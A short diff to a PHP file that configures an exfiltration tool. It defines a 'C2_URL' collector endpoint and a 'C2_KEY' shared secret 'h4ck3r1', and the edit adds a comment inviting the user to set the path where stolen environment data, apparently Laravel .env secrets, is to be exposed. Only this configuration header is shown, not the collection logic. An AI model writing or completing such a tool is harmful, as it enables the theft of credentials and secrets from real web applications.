@@ -7,7 +7,7 @@ declare(strict_types=1);
  */
 
 // --- Your exfiltration endpoint ---
-define('C2_URL', 'http://localhost/laravel9/collect.php');
+define('C2_URL', 'http://localhost/laravel9/collect.php');  //give path where you want to expose env data
 define('C2_KEY', 'h4ck3r1'); // shared secret to validate incoming data
 
 
